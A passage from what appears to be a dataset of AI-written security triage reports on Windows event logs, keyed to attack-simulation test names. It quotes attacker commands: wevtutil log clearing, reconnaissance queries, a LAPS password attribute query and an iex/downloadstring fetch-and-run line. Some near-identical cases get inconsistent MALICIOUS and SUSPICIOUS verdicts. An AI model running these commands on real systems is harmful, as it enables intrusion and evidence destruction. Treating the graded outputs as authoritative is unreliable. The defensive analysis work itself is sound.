   - Event ID 4672 in the Security log denotes special privileges assigned to ""admin_test"". The assigned privileges include `SeDebugPrivilege` and `SeImpersonatePrivilege`, which are notably powerful and often linked with privilege escalation techniques.

5. **Anomaly in Security and System Logs**:
   - Numerous Event ID 5379 entries are associated with the read operation of credentials (likely failed access attempts or enumeration), and the corresponding return codes indicate unsuccessful operations.

6. **Administrative Remote Logons**:
   - Event ID 4624 shows network logons (Type 3) for the ""admin_test"" user from an external device, `DESKTOP-3HL5B2P`, which might be unexpected or unauthorized.

Given these findings:

- **Resolution**: **SUSPICIOUS** - The activities observed, like clearing logs, executing complex PowerShell scripts, special privilege assignment, and remote administrative logons, are suspicious and necessitate further investigation.

**Guidance on How to Proceed**:
- Review user ""admin_test""'s activity logs and any associated user accounts.
- Investigate any scripts run via PowerShell for malicious code or indicators of compromise.
- Check for unexpected software installations or modifications that coincide with the log-clearing times.
- Verify network connections and examine the necessity and legitimacy of remote devices like `DESKTOP-3HL5B2P`.
- Conduct a security review and health check of affected systems for any signs of compromise.
- Increase monitoring and alerting on log clearance activities and privilege escalations to ensure rapid detection of similar future activities."
Windows MachineGUID Discovery,"Upon reviewing the provided logs, several indicators of potential malicious activity and misalignment with normal system behavior are noted. Below is a detailed analysis:

### Suspicious Log Entries

#### 1. Wevtutil.exe Usage:
- **Sysmon Log Entries**: Multiple instances of `wevtutil.exe` being executed with the command line options like `""wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl Security`, etc., suggest the clearing of event logs. The pattern indicates multiple diverse logs (Operational, Application, System, Security) have been cleared.
- **Associated System Log Entries**: Clear evidence of log file clearing is witnessed in System Event ID 104 and Security Event ID 1102, recorded nearly simultaneously, corroborating the use of `wevtutil.exe`.

#### 2. Log File Clearing:
- **System Log (Event ID 104)**: Log files for System and PowerShell channels were cleared by the user 'admin_test'.
- **Security Log (Event ID 1102)**: Security logs were also cleared, linked to the same user and process, further suggesting attempts to hide tracks of unauthorized or malicious access.

#### 3. CMD and REG Usage:
- The execution of `cmd.exe` with the command `REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid` seems benign by itself but may be indicative of reconnaissance activity when considered alongside the abnormal behavior described above.

#### 4. Time Manipulation:
- **Security Log (Event ID 4616)**: There are entries indicating system time manipulation, which can be a tactic to hide malicious activity timelines or to synchronize unauthorized actions with cleared logs.

### Assessment

The logs show a consistent pattern of behavior that could be considered malicious:
- **Log clearing** is a well-recognized tactic used by attackers post-compromise to erase traces of their activities.
- **Time manipulation** further supplements log clearing efforts, helps in confusing audit trails, and hiding potential evidence of any unauthorized activities.
- The consistent use of administrative tools by the user 'admin_test' in a short time frame raises suspicion, suggesting the account may have been compromised or is being misused.

### Resolution: MALICIOUS

The activities captured in the logs are indicative of malicious behavior. This involves deliberate clearing of logs, which is a strong indicator of attempts to hide unauthorized activities and potential system compromise.

### Guidance

1. **Immediate Actions:**

Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property,"Upon analyzing the provided Windows event logs, several indicators suggest suspicious or potentially malicious activity on the host Server002. Here is a detailed analysis:

### Key Areas of Concern:

1. **Log File Clearing Events:**
   - Multiple events show the clearing of logs. Specifically, EventID 104 in the System log and EventID 1102 in the Security log indicate that an account, ""admin_test"", has cleared logs on the server for various channels (System, Security, and Windows PowerShell).
   - In particular, the use of `wevtutil.exe` to clear these logs, as seen in Sysmon events, raises a significant red flag. This often indicates an attempt to hide malicious activity.

2. **Time Manipulation:**
   - Kernel-General EventID 1 and Security EventID 4616 reveal changes in system time, which is not typical behavior in a standard operational environment and can be indicative of malicious attempts to alter timestamps to confuse logging trails or bypass certain security measures.

3. **Unusual Execution and Command-Line Activity:**
   - PowerShell logs indicate the execution of potentially sensitive Active Directory command (`Get-ADComputer`) with properties that may imply manipulation or extraction of account-related information (e.g., ms-Mcs-AdmPwd and ms-Mcs-AdmPwdExpirationTime).
   - Sysmon logs show a series of `wevtutil.exe` executions clearing log channels, combined with other system utilities like `whoami.exe` and `HOSTNAME.EXE`, which are sometimes used in reconnaissance phases by attackers.

4. **Integrity Level and User Context:**
   - Many processes run with a high integrity level under the user ""SERVER002\\admin_test"", indicating elevated privileges being used, which corresponds with the suspicious log-clearing activity.

5. **Frequent Edge Update Executions:**
   - While most Microsoft Edge Update executions can be benign, the sheer number and concurrency of their appearance might suggest they are being leveraged as part of a lateral movement technique, possibly using legitimate software for nefarious purposes to disguise their actions.

### Resolution:

- **Resolution: MALICIOUS**
  
The combination of log-clearing, time manipulation, use of command-line utilities, elevated process integrity levels, and the suspicious frequency of PowerShell activities points toward a likely compromise. The activities suggest an attempt to perform actions while bypassing standard monitoring tools and coverage.

Examine domain password policy - Windows,"The provided Windows event logs present several important activities that could be indicative of suspicious behavior. Here's a detailed analysis:

### Indicators of Suspicious Behavior:
1. **Log Clearing Events**:
   - The logs contain multiple `EventID=104` (Log File Cleared) entries for System and Windows PowerShell channels with the user `admin_test`. Clearing event logs, especially security-related ones, can be an indication of malicious intent, as attackers commonly attempt to cover their tracks.

2. **Privilege Use and Logon Events**:
   - The logs register `EventID=4672`, indicating special privileges were assigned to `admin_test`, including `SeDebugPrivilege` and other powerful privileges which allow wide-ranging capabilities on the system. These privileges are typically not required for routine administrative tasks and raise suspicion if used without a justified reason.
   - `EventID=4624` and `EventID=4634` indicate logon and logoff events for the user `admin_test` from a remote workstation (`DESKTOP-3HL5B2P`) over NTLM, notifying us about possible remote administrative sessions.

3. **Time Manipulation**:
   - The events show time adjustments (`EventID=4616`) executed by `svchost.exe` within a short period, suggesting possible time altering attempts. This action fits the criteria of anti-forensics tactics where altering system time might be used to cover tracks.

4. **Use of `wevtutil.exe`**:
   - The use of `wevtutil.exe` to clear logs (`cl` command) multiple times is explicitly recorded. This is an unusual behavior for a legitimate user session unless performing specific, justifiable tests or maintenance.

5. **Command Execution**:
   - There were executions of potentially reconnaissance-related commands such as `whoami.exe` and `net accounts /domain` via `cmd.exe`, indicating attempts to gather information about network account configurations and current logged-in users.

### Assessment:
- The logs encompass notable activities commonly associated with evasive tactics and potential compromise attempts, such as log clearing, unusual privilege assignments, time manipulation, and information gathering commands.

### Resolution:
- **SUSPICIOUS**: These logs contain several suspicious activities that warrant further investigation. The events reflect potential unauthorized and harmful actions that require inquiry into user activities, verification of legitimate need for high privileges, and examination of corresponding user access and threat intelligence data for potential compromise.

System Discovery using SharpView,"### Analysis of Logs

Upon inspection of the provided Windows event logs, there are several activities of interest that stand out for further scrutiny:

1. **Wevtutil and Event Log Clearing**: 
   - Multiple Sysmon Event ID 1 (Process Creation) and Event ID 5 (Process Termination) events show the execution of `wevtutil.exe` with commands to clear various logs such as ""Microsoft-Windows-Sysmon/Operational,"" ""Application,"" ""System,"" ""Security,"" and ""Windows PowerShell."" 
   - Corresponding system events (Event ID 104) show that the logs were cleared by the user `SERVER002\\admin_test`. Clearing event logs is an activity that attackers might perform to cover their tracks and is generally suspicious, unless verified as a legitimate maintenance task.
   - Security Log Event ID 1102 indicates that the Security log was cleared, which is particularly risky as it is a critical log in identifying unauthorized actions.

2. **Suspicious PowerShell Activity**:
   - There are multiple occurrences of `powershell.exe` executing with suspicious scripts. One particular execution recorded logs suggesting the use of PowerShell to run potentially harmful scripts (e.g., “Invoke-ACLScanner,” “Invoke-Kerberoast,” and “Find-DomainShare”), usually associated with lateral movement and privilege escalation tasks by adversaries.
   - This was seen coupled with mentions of ""SharpView.exe,"" a tool known for Active Directory enumeration often utilized in penetration testing frameworks like the Atomic Red Team.
   
3. **Use of TrustedInstaller and TiWorker**:
   - The presence of processes such as `TrustedInstaller.exe` and `TiWorker.exe` is common; however, we should verify the context to ensure it aligns with normal relevant updates or maintenance schedules.

4. **Credentials and Security Monitoring**:
   - Security log entries such as Event ID 4624 (Account Logon) and Event ID 4672 (Special privileges assigned) are seen, reflecting authentication activities. Although these are frequent events, in conjunction with the log clearance, they suggest attempts at bypassing tracking mechanisms.
   - Consistent references to Microsoft accounts and potential failed authentication attempts (Event ID 5379) indicate a potential probing of account states or credentials, but these may not directly suggest malicious activity without additional context.

### Assessment and Resolution

Given the analysis of these events, which includes the suspicious clearing of event logs, usage patterns of PowerShell for potential offensive security operations, and account activities, there is a basis to label these activities as posing potential threats. However, without confirmed malicious usage beyond these indications, further investigation is required to substantiate or dispel these threats.

- **Resolution**: **SUSPICIOUS**

### Guidance on How to Proceed

1. **Immediate Actions**:
   - Conduct a thorough review of users and access logs to verify if these activities align with scheduled administrative tasks or maintenance operations.
   - Discuss with relevant admins to confirm if these actions were sanctioned and whether the PowerShell activities were intended penetration tests.

2. **Forensic Analysis and Monitoring**:
   - Establish a deeper forensic analysis focusing on the time frame and user activities to confirm legitimacy.
   - Increase monitoring of PowerShell executions via logging enhancements to catch future anomalous scripts swiftly.
   - Ensure logging mechanisms are protected against unauthorized clearance.

3. **Awareness and Education**:
   - Educate system administrators about the risks of clearing logs and establish procedures that justify such actions if legitimate.
   - Consider implementing policies requiring two-factor authentication for sensitive operations to prevent unauthorized access. 

Overall, these suspicious activities necessitate immediate attention to rule out or confirm potential compromise scenarios."
Security Software Discovery - AV Discovery via Get-CimInstance and Get-WmiObject cmdlets,"Upon reviewing the logs provided, several activities stand out as potentially suspicious and indicative of possible malicious activity:

1. **Log File Cleared Events:**
   - Multiple entries indicate that log files, including the System, Windows PowerShell, and Security logs, were cleared by a user named ""admin_test."" The clearing of event logs is a common tactic used by attackers to cover their tracks after illicit activity. These events are captured under Event ID 104 (System log cleared) and Event ID 1102 (Security log cleared) and are a critical indicator of potential unauthorized actions, especially when not aligned with standard operational procedures.

2. **Use of `wevtutil.exe` Command:**
   - The process `wevtutil.exe` is repeatedly used with command-line arguments to clear various event logs such as Sysmon/Operational and several others. Using `wevtutil` to clear event logs is not typically part of routine administrative tasks and is generally regarded as a red flag, strongly suggesting log manipulation.

3. **PowerShell Commands:**
   - Execution of PowerShell commands such as `Get-CimInstance` and `Get-WmiObject` to query antivirus products is noted. While this can be a legitimate query, when combined with log clearing actions, it might be used to gauge the security posture (to see installed AVs) before conducting further malicious actions.

4. **Time Change Events:**
   - There are indications of changes to system time (Event ID 24) and associated security auditing (Event ID 4616). Although changing system time can have legitimate purposes, when tied with log clearing, it can serve the purpose of undermining forensic timestamp reliability.

5. **Creation of Default System Processes in Temporal Context:**
   - Numerous instances involving default Windows system processes (e.g., `hostname.exe`, `whoami.exe`) being executed under the same ""admin_test"" user context during the timeframe of log manipulations. Although these stand-alone actions might be benign, their temporal alignment with other suspicious activities prompts further scrutiny.

6. **High Integrity Level Processes:**
   - Several processes initiated by the `admin_test` user run at a high integrity level, allowing potential for privilege abuse or sensitive operations.

### Assessment:
Given the patterns of log file manipulation, suspicious use of system utilities (`wevtutil.exe` and PowerShell), and time discrepancies, the activities observed in the logs suggest strong indicators of malicious activity or an attempted compromise.

### Resolution:
- **MALICIOUS**: The combination of events indicates a deliberate attempt to manipulate and clear security logs, potentially compromising the system. Immediate steps should be taken to investigate further and mitigate potential risks. This includes checking for unauthorized access, reviewing installed software for malicious code, and conducting a thorough forensic investigation to identify any further compromise.

### Guidance:
1. Isolate the system `Server002` to prevent further potential damage or lateral movement.
2. Conduct a detailed forensic analysis, including memory dumps and disk imaging.
3. Review administrative access policies and monitor all privileged account activities.
4. Audit and reinforce security logging and monitoring configurations to detect similar activity in the future.
5. Change credentials for any accounts potentially compromised, focusing on the `admin_test` account.

These recommendations will help in controlling any damage, protecting against further unauthorized activity, and identifying the scope of the compromise."
WinPwn - PowerSharpPack - Watson searching for missing windows patches,"Upon analysis of the provided event logs from ""Server002"", the following observations and assessment have been made:

1. **Application Log:**
   - Logs indicate standard operations such as updates from Security Center and Software Protection Platform. Windows Defender is reported as active. No suspicious activities are noted here. 

2. **Windows PowerShell Log:**
   - Multiple PowerShell events indicate the execution of a command that utilizes `iex(new-object net.webclient).downloadstring(...)` to download and execute a script `Invoke-SharpWatson.ps1` from a third-party GitHub repository. 
   - This behavior is unusual and potentially dangerous as it downloads and executes a script from the internet, which can compromise the host system. It constitutes a significant security risk.

3. **Sysmon Log:**
   - Sysmon logs show execution of PowerShell with the same suspicious command, and several instances of `wevtutil.exe` being used to clear logs (`cl <Channel>`). 
   - The process chain reveals PowerShell executing with a potentially malicious command, as well as commands clearing specific logs (Application, System, Security, and Windows PowerShell). This may suggest attempts to cover tracks post-execution of malicious activity.
  
4. **Security Log:**
   - Event 1102 indicates that the security logs were cleared by user `admin_test`. Cleared logs are often indicative of an attacker attempting to cover malicious activities.

5. **System Log:**
   - System logs confirm log clearance activity. The logs were cleared for both System and Windows PowerShell channels at approximately the same time the suspicious PowerShell script was executed.

**Assessment:**
- The combination of downloading and executing a script from the internet using PowerShell, coupled with immediate log clearance activities, are strong indicators of compromise. This behavior suggests an attempt to execute potentially malicious code while obscuring audit trails.

**Resolution: MALICIOUS**
- This activity is deemed malicious. Immediate action should be taken to isolate the affected host, and a full-scale incident response should be initiated. Full audit of potentially affected machines should be conducted, and the event should be reported to relevant internal and external entities if necessary. In addition, consider updating security policies to restrict such uncontrolled execution of scripts and monitoring for such suspicious PowerShell activities in the future."
Process Discovery - PC Hunter,"Upon reviewing the provided Windows event logs, several indications of potentially malicious activity are observed:

1. **Log Clearing Events**:
   - Numerous instances of log clearing are noted, such as Event ID 1102 in the Security log and Event ID 104 in the System log. These indicate that the Windows event logs have been cleared (e.g., using `wevtutil.exe`). Log clearing is a common tactic used by attackers to cover their tracks after gaining access or conducting attacks on a system.

2. **Use of Powerful Privileges**:
   - Event ID 4672 indicates privileged logons that include sensitive privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeImpersonatePrivilege`. These privileges provide substantial control over the system and can potentially be used for malicious purposes.

3. **Suspicious Process Execution**:
   - There are logs showing the execution of `PCHunter64.exe` via PowerShell (`powershell.exe` with `Start-Process`). PCHunter is an aggressive tool that provides deep insights into the system, often used for rooting out malware or system exploration. However, when executed from non-standard locations like `C:\\Temp\\ExternalPayloads`, it may indicate unauthorized use, especially given the context of log clearing.

4. **Consistent Use of PowerShell for Executions**:
   - Multiple PowerShell events are recorded in close succession (Event IDs 600 and 400 series in the PowerShell log). The use of PowerShell with command lines indicative of launching potentially unwanted programs is concerning, especially when bypassing normal user interaction, hinting at automated script execution.

5. **Presence of External Tools**:
   - The command line execution of external payloads (`C:\\Temp\\ExternalPayloads\\PCHunter_free\\PCHunter64.exe`) without clear indicators of benign intent raises suspicion. This directory and tool usage suggest that external software is being used possibly for unauthorized system analysis or manipulation.

Given the combination of log clearing, the use of privileged accounts, suspicious PowerShell activity, and execution of external tools, the activity is indicative of potential unauthorized and malicious behavior. Though the logs do not explicitly confirm malicious activity beyond doubt due to their indirect nature, the presence of these signs strongly suggests suspicious activity.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- Immediately isolate the affected system (`Server002`) from the network to prevent potential lateral movement.
- Conduct a comprehensive malware scan and forensic analysis on the system.
- Review user accounts, particularly `admin_test`, for suspicious activity and consider resetting passwords.
- Analyze network activity logs to identify possible data exfiltration or command and control communications.
- Implement enhanced monitoring and reviewing of logs for any systems with similar configurations or access to the affected system.
- Educate users and conduct training on detecting potential phishing or social engineering attempts that could lead to such unauthorized access."
Discover System Language with chcp,"Upon analyzing the event logs, the following observations can be made:

1. **Process Execution**: The logs reveal several executions of the `wevtutil.exe` process, which is used to manage Windows event logs from the command line. This alone is not inherently malicious, but multiple instances indicate an unusual focus on clearing or manipulating event logs, as demonstrated by the clearing of various logs including `Sysmon`, `Application`, `System`, and `Security` channels.

2. **Log Cleared Events**: 
   - The `System` log was cleared by the user `admin_test`, as noted in the event with an ID of 104. 
   - The `Windows PowerShell` log was similarly cleared.
   - A `Security` log clearance is captured in event ID 1102, indicating that the user `admin_test` initiated the action.
   Clearing logs is a common tactic used by attackers to cover their tracks, making this activity suspicious, if not outright malicious.

3. **Privilege and Logon Events**: Multiple logon events (IDs 4624 and 4634) and privilege assignments (ID 4672) are associated with the `admin_test` account. The user possesses a high level of privileges including security, backup, and debug privileges, which is typical for administrative accounts. The elevated permissions in conjunction with other suspicious activities increase the risk profile of this user session.

4. **Time Manipulation**: There is an event (ID 4616) indicating that the system time was changed. This is another technique that can be employed by attackers to alter event timestamps, thus obfuscating their trail.

5. **Unusual Command Line Activity**: The execution of `HOSTNAME.EXE` and `WHOAMI.EXE` is captured in the logs. While not inherently malicious, querying for system identity and logged-in user is often part of reconnaissance by attackers.

Based on these observations, there are multiple suspicious elements:
- The deliberate clearing of logs.
- High-privilege activity and potentially unauthorized logon/logoff events.
- System time manipulation.

These indicators suggest an attempt to obfuscate tracks and unauthorized access or activity. Therefore, the final assessment of these logs is:

**Resolution: MALICIOUS**

### Guidance on how to proceed:
- Isolate and monitor the affected host (Server002) for further suspicious activity.
- Conduct a comprehensive investigation on the `admin_test` account and its recent activities to confirm legitimacy or compromise.
- Review existing security policies and harden systems against unauthorized access, particularly focusing on audit logging and account management.
- Consider implementing stricter access controls and log monitoring to detect similar behaviors in the future.
- Assess the need for a wider forensic investigation to determine the scope of compromise and potential data exfiltration."
Process Discovery - wmic process,"Upon reviewing the provided Windows event logs, here are some key points and suspicious activities that stand out:

1. **Security Log - Event ID 1102**: 
   - This event indicates that the audit log was cleared. The user associated with the log clearing is ""admin_test"". Clearing of event logs can be suspicious, especially if it happens without prior notice or justification, as it could be an attempt to hide malicious activities.

2. **Security Log - Event ID 4616**:
   - There are events indicating a change in system time by ""LOCAL SERVICE"". Time changes can be suspicious as they might be used to evade detection or to timestamp falsified activities.

3. **Sysmon Log - Usage of `wevtutil.exe`**:
   - The `wevtutil.exe` utility was used multiple times to clear specific event logs such as Sysmon, Application, System, Security, and Windows PowerShell. 
   - This behavior, especially when conducted by the same ""admin_test"" user, aligns with tactics to cover tracks after potential malicious actions.

4. **Sysmon Log - Unusual process commands**:
   - Several `cmd.exe` and `wmic.exe` commands are executed with high integrity levels. The usage of these utilities for listing processes (`wmic process get /format:list`) during this suspicious timeframe, potentially by the same user, might indicate reconnaissance activities.
   - Other command-line utilities such as `hostname.exe` and `whoami.exe` are executed, which could be used in gathering local information potentially as part of an attack.

5. **Sysmon Log and Event Command-line Usage**:
   - All suspicious activities seem to be executed under the same user account ""admin_test"", and the focus on clearing event logs strongly indicates a potential insider threat or an external party using this account.

6. **Event Log Entries for Log Clearance**:
   - Windows Eventlog entries showing log clearance in different channels (System and Windows PowerShell) further concur with attempts to delete forensic data.

Overall, combining these observations, we can conclude that the series of activities observed in these logs are highly suspicious. The clearing of logs, time changes, and the use of various built-in command-line utilities all point towards potentially malicious intent to conceal illicit activities.

**Resolution: SUSPICIOUS**

**Guidance:**
- Immediate investigation into the user account ""admin_test"" should be initiated to determine whether it has been compromised.
- Validate all other logs/checkpoints to see if any external connections or additional suspicious activities are detected during this timeframe.
- Consider enhancing logging and monitoring, and temporarily suspend or closely monitor the account in question.
- If feasible, conduct an internal audit of the systems and network to identify any additional anomalies and secure any sensitive data or systems potentially affected."
